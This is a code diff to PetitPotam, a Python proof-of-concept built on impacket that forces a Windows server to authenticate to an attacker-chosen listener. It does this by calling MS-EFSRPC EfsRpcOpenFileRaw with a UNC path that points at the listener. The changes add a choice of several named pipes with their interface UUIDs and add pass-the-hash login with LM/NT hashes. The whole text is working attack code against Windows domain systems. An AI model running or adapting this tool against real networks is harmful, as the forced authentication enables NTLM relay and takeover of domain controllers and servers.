@@ -7,15 +7,12 @@
 
 
 import sys
-import logging
 import argparse
 
-from struct import unpack
-from impacket import version, system_errors, LOG
+from impacket import system_errors
 from impacket.dcerpc.v5 import transport
-from impacket.structure import hexdump
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
-from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR
+from impacket.dcerpc.v5.dtypes import ULONG, WSTR
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.uuid import uuidtup_to_bin
 
@@ -54,7 +51,6 @@ class DCERPCSessionError(DCERPCException):
 ################################################################################
 # STRUCTURES
 ################################################################################
-
 class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
     align = 1
     structure = (
@@ -64,14 +60,14 @@ class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
 ################################################################################
 # RPC CALLS
 ################################################################################
-class GEfsRpcOpenFileRaw(NDRCALL):
+class EfsRpcOpenFileRaw(NDRCALL):
     opnum = 0
     structure = (
         ('fileName', WSTR), 
         ('Flag', ULONG),
     )
     
-class GEfsRpcOpenFileRawResponse(NDRCALL):
+class EfsRpcOpenFileRawResponse(NDRCALL):
     structure = (
         ('hContext', EXIMPORT_CONTEXT_HANDLE),
         ('ErrorCode', ULONG),
@@ -81,46 +77,60 @@ class GEfsRpcOpenFileRawResponse(NDRCALL):
 # OPNUMs and their corresponding structures
 ################################################################################
 OPNUMS = {
- 0 : (GEfsRpcOpenFileRaw, GEfsRpcOpenFileRawResponse),
-
+ 0 : (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
 }
  
 class CoerceAuth():
-    
-    
-    
-    def connect(self, username, password, domain, nthash, target):
-
-        stringBinding = r'ncacn_np:%s[\PIPE\lsarpc]' % target # possible aussi via efsrpc (en changeant d'UUID) mais ce named pipe est moins universel et plus rare que lsarpc ;)
-        MSRPC_UUID_EFSR = uuidtup_to_bin(('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')) # for LSARPC named pipe ;)
-
-        rpctransport = transport.DCERPCTransportFactory(stringBinding)
+    def connect(self, username, password, domain, lmhash, nthash, target, pipe):
+        binding_params = {
+            'lsarpc': {
+                'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
+                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
+            },
+            'efsr': {
+                'stringBinding': r'ncacn_np:%s[\PIPE\efsr]' % target,
+                'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
+            },
+            'samr': {
+                'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % target,
+                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
+            },
+            'lsass': {
+                'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % target,
+                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
+            },
+            'netlogon': {
+                'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % target,
+                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
+            },
+        }
+        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
         if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(username, password, domain, nthash)
+            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
         dce = rpctransport.get_dce_rpc()
         #dce.set_auth_type(RPC_C_AUTHN_WINNT)
         #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-        print("[-] Connecting to %s!" % target)
+        print("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
         try:
             dce.connect()
         except Exception as e:
             print("Something went wrong, check error status => %s" % str(e))  
             sys.exit()
         print("[+] Connected!")
-        print("[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e !")
+        print("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
         try:
-            dce.bind(MSRPC_UUID_EFSR)
+            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
         except Exception as e:
             print("Something went wrong, check error status => %s" % str(e)) 
             sys.exit()
-        print("[+] Succesfully Bound!")
+        print("[+] Successfully bound!")
         return dce
 
 
-    def GEfsRpcOpenFileRaw(self, dce, listener):
-        print("[-] Sending GEfsRpcOpenFileRaw!")
+    def EfsRpcOpenFileRaw(self, dce, listener):
+        print("[-] Sending EfsRpcOpenFileRaw!")
         try:
-            request = GEfsRpcOpenFileRaw()
+            request = EfsRpcOpenFileRaw()
             request['fileName'] = '\\\\%s\\c$\\Settings.ini\x00' % listener
             request['Flag'] = 0
             #request.dump()
@@ -135,37 +145,28 @@ class CoerceAuth():
                 print("Something went wrong, check error status => %s" % str(e)) 
                 sys.exit()
 def main():
-
-    
-    global target
-    global listener
-    
-
     parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
     parser.add_argument('-u', '--username', action="store", default='', help='valid username')
     parser.add_argument('-p', '--password', action="store", default='', help='valid password')
     parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
-    parser.add_argument('--ntlm', action="store", default='', help='nt hash')
+    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
+    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass'], default='lsarpc', help='Named pipe to use (default: lsarpc)')
     parser.add_argument('listener', help='ip address or hostname of listener')
     parser.add_argument('target', help='ip address or hostname of target')
-
     options = parser.parse_args()
 
-    domain = options.domain
-    username = options.username
-    password = options.password
-    ntlm = options.ntlm
-    listener = options.listener
-    target = options.target
-   
-      
+    if options.hashes is not None:
+        lmhash, nthash = options.hashes.split(':')
+    else:
+        lmhash = ''
+        nthash = ''
+
     print(show_banner)
     
     plop = CoerceAuth()
-    dce = plop.connect(username, password, domain, ntlm, target)
-    plop.GEfsRpcOpenFileRaw(dce, listener)
+    dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=options.pipe)
+    plop.EfsRpcOpenFileRaw(dce, options.listener)
 
-    
     dce.disconnect()
     sys.exit()   
              
